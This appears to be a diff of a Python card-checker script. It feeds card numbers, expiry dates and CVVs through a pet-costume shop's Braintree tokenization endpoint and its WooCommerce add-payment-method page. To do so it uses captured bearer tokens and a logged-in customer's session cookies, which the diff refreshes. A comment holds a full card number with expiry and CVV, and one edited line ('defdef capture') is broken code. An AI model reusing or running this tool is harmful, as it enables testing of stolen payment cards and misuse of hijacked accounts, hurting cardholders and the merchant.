@@ -1,4 +1,4 @@
-def capture(string, start, end):
+defdef capture(string, start, end):
     start_pos, end_pos = string.find(start), string.find(
         end, string.find(start) + len(start)
     )
@@ -57,11 +57,13 @@ def chk(card):
 
 
 
+
+
 	headers = {
     'authority': 'payments.braintree-api.com',
     'accept': '*/*',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mjk0MjcxMTYsImp0aSI6IjNmNDliMmYxLWU3ZjQtNGM2MC05OTNhLTljNjIzZDFiNzY4ZSIsInN1YiI6InQ3aHY2MmdnMnpyMjhwOHkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InQ3aHY2MmdnMnpyMjhwOHkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.kY_nvNlhSi37F6ULMd7PegDKW1sVg4m7WU99RLZ-pcqEm2aAHmkctCAJvXtSWs5nnkSS-EpBhO_EivLCFR3dFQ',
+    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mjk0NzAxODMsImp0aSI6IjdiMTRkZTNmLTVhMjUtNDZkNC04MmRjLWJiYWRiYjViNWI5OSIsInN1YiI6InQ3aHY2MmdnMnpyMjhwOHkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InQ3aHY2MmdnMnpyMjhwOHkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.6mnGhSYzmKFHfSQW_uGseq40oGJ0lPgkJ8-Q_hJR7qonZNzhE-6gEjHTRgEbS5wEluZQ4MhefLEIX_LqWrkP1w',
     'braintree-version': '2018-05-10',
     'cache-control': 'no-cache',
     'content-type': 'application/json',
@@ -81,7 +83,7 @@ def chk(card):
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'dropin2',
-        'sessionId': '51dd0e38-30ce-4ccf-9c55-5192bb8ba04e',
+        'sessionId': '0784f05a-1dca-495b-8890-2308f28167b6',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -90,7 +92,7 @@ def chk(card):
                 'number': n,
                 'expirationMonth': mm,
                 'expirationYear': yy,
-                'cvv': cvc,
+                'cvv':cvc,
             },
             'options': {
                 'validate': False,
@@ -104,12 +106,14 @@ def chk(card):
 
 # Note: json_data will not be serialized by requests
 # exactly as it was in the original request.
-#data = '{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"51dd0e38-30ce-4ccf-9c55-5192bb8ba04e"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4659017718276017","expirationMonth":"08","expirationYear":"2027","cvv":"351"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
+#data = '{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"0784f05a-1dca-495b-8890-2308f28167b6"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4659017718276017","expirationMonth":"08","expirationYear":"2027","cvv":"351"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
 #response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
 
 	tok = response.json()['data']['tokenizeCreditCard']['token']
 
 #2
+
+
 
 
 
@@ -121,15 +125,15 @@ def chk(card):
     'wordpress_logged_in_289d90acb685b9dc87359ec1a035bdf9': 'lyy446333%7C1729864385%7CHlWB5OTHRQo8DDTNp2XNM3rIhbGroPSNCPgRhOoiU6N%7Cf9071c64db2db2dc86b93cf717a674e19651aa00f89ca2658c2dba2bab266fd9',
     'wp_woocommerce_session_289d90acb685b9dc87359ec1a035bdf9': '2881%7C%7C1729432253%7C%7C1729428653%7C%7C9511f2552ec49d976c240b2dba007972',
     '_gcl_au': '1.1.1302227665.1729259464.968699663.1729259521.1729259711',
-    '_ga_128CPY397L': 'GS1.1.1729259464.1.1.1729259863.0.0.0',
-    'mcfw-wp-user-cookie': 'Mjg4MXwwfDYzfDQwMDMxXzhiMWQ5MTczYTViMTU4YTM4YjZkNzA2NmI2ZmM0NzAyNzc4MjkyN2NmYzdiNjM5M2M3MTQzZjI5OTExNzk1MTg%3D',
+    'mcfw-wp-user-cookie': 'Mjg4MXwwfDYzfDQwMDMyXzMxMjc3ZDA1YjE5NWE2NDAxZmJjZDIxOWZjYjhjNTk1ZjlmMTQzM2MxY2Y1YzBhMGI0YTBiNjA3ODQ5NGU2ZmM%3D',
     'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2024-10-19%2012%3A25%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fpayment-methods%2F',
-    'sbjs_first_add': 'fd%3D2024-10-19%2012%3A25%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fpayment-methods%2F',
+    'sbjs_current_add': 'fd%3D2024-10-20%2000%3A23%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_first_add': 'fd%3D2024-10-20%2000%3A23%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
     'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
     'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fadd-payment-method%2F',
+    '_ga_128CPY397L': 'GS1.1.1729383787.2.0.1729383787.0.0.0',
     '_uetsid': '065c33208d5811efb16bb958e6e5087e',
     '_uetvid': '065de7d08d5811ef90035566a420a3c4',
 }
@@ -140,7 +144,7 @@ def chk(card):
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'no-cache',
     'content-type': 'application/x-www-form-urlencoded',
-    # 'cookie': '_ga=GA1.1.1237750036.1729259464; _fbp=fb.1.1729259465569.74668477555339401; mc_landing_site=https%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2F; wordpress_logged_in_289d90acb685b9dc87359ec1a035bdf9=lyy446333%7C1729864385%7CHlWB5OTHRQo8DDTNp2XNM3rIhbGroPSNCPgRhOoiU6N%7Cf9071c64db2db2dc86b93cf717a674e19651aa00f89ca2658c2dba2bab266fd9; wp_woocommerce_session_289d90acb685b9dc87359ec1a035bdf9=2881%7C%7C1729432253%7C%7C1729428653%7C%7C9511f2552ec49d976c240b2dba007972; _gcl_au=1.1.1302227665.1729259464.968699663.1729259521.1729259711; _ga_128CPY397L=GS1.1.1729259464.1.1.1729259863.0.0.0; mcfw-wp-user-cookie=Mjg4MXwwfDYzfDQwMDMxXzhiMWQ5MTczYTViMTU4YTM4YjZkNzA2NmI2ZmM0NzAyNzc4MjkyN2NmYzdiNjM5M2M3MTQzZjI5OTExNzk1MTg%3D; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-19%2012%3A25%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-10-19%2012%3A25%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fadd-payment-method%2F; _uetsid=065c33208d5811efb16bb958e6e5087e; _uetvid=065de7d08d5811ef90035566a420a3c4',
+    # 'cookie': '_ga=GA1.1.1237750036.1729259464; _fbp=fb.1.1729259465569.74668477555339401; mc_landing_site=https%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2F; wordpress_logged_in_289d90acb685b9dc87359ec1a035bdf9=lyy446333%7C1729864385%7CHlWB5OTHRQo8DDTNp2XNM3rIhbGroPSNCPgRhOoiU6N%7Cf9071c64db2db2dc86b93cf717a674e19651aa00f89ca2658c2dba2bab266fd9; wp_woocommerce_session_289d90acb685b9dc87359ec1a035bdf9=2881%7C%7C1729432253%7C%7C1729428653%7C%7C9511f2552ec49d976c240b2dba007972; _gcl_au=1.1.1302227665.1729259464.968699663.1729259521.1729259711; mcfw-wp-user-cookie=Mjg4MXwwfDYzfDQwMDMyXzMxMjc3ZDA1YjE5NWE2NDAxZmJjZDIxOWZjYjhjNTk1ZjlmMTQzM2MxY2Y1YzBhMGI0YTBiNjA3ODQ5NGU2ZmM%3D; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-20%2000%3A23%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-10-20%2000%3A23%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fadd-payment-method%2F; _ga_128CPY397L=GS1.1.1729383787.2.0.1729383787.0.0.0; _uetsid=065c33208d5811efb16bb958e6e5087e; _uetvid=065de7d08d5811ef90035566a420a3c4',
     'origin': 'https://petcostumecenter.com',
     'pragma': 'no-cache',
     'referer': 'https://petcostumecenter.com/my-account/add-payment-method/',
@@ -158,10 +162,10 @@ def chk(card):
 	data = {
     'payment_method': 'braintree_cc',
     'braintree_cc_nonce_key': tok,
-    'braintree_cc_device_data': '{"device_session_id":"09fbb8e274fa7303c1729b96e34cf482","fraud_merchant_id":null,"correlation_id":"3d3c2099-b301-468b-9901-87c43fb3"}',
+    'braintree_cc_device_data': '{"device_session_id":"291988d290adabaac9059482902218fa","fraud_merchant_id":null,"correlation_id":"538607fb-ef35-42e7-89da-2d93a7c3"}',
     'braintree_cc_3ds_nonce_key': '',
-    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/t7hv62gg2zr28p8y/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/t7hv62gg2zr28p8y"},"merchantId":"t7hv62gg2zr28p8y","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["Discover","JCB","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"PET COSTUME CENTER","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mjk0MjcxMjUsImp0aSI6IjZmNTE1MWRmLTNhOTQtNDc5Ny1hMmJlLTJhMTcyYTM5YjNhYSIsInN1YiI6InQ3aHY2MmdnMnpyMjhwOHkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InQ3aHY2MmdnMnpyMjhwOHkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.dpFDlqIgDp6Csv2wY391jP4K3aVz4CJUOjvsipyOAUOKMtcBbkDqOD2LoYHwAzy9aU6QYv-qNcHZNBAVPOay6g","paypalClientId":null,"supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":false}',
-    'woocommerce-add-payment-method-nonce': '1db1836a0b',
+    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/t7hv62gg2zr28p8y/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/t7hv62gg2zr28p8y"},"merchantId":"t7hv62gg2zr28p8y","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["Discover","JCB","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"PET COSTUME CENTER","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mjk0NzAxODksImp0aSI6IjU4YTkyMTM1LWE4YTMtNGM2ZS05ZGY3LWVmNDgwNDhkODFjMCIsInN1YiI6InQ3aHY2MmdnMnpyMjhwOHkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InQ3aHY2MmdnMnpyMjhwOHkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.y7X_uErRi98pnAXCIGiN-KXLfbf6uZo4KAYYVnNyGhmRuofUcilecHlmFDyR0ws_gDjjmKAJh_-6d-DTAqm0nw","paypalClientId":null,"supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":false}',
+    'woocommerce-add-payment-method-nonce': '34aa324ba9',
     '_wp_http_referer': '/my-account/add-payment-method/',
     'woocommerce_add_payment_method': '1',
 }
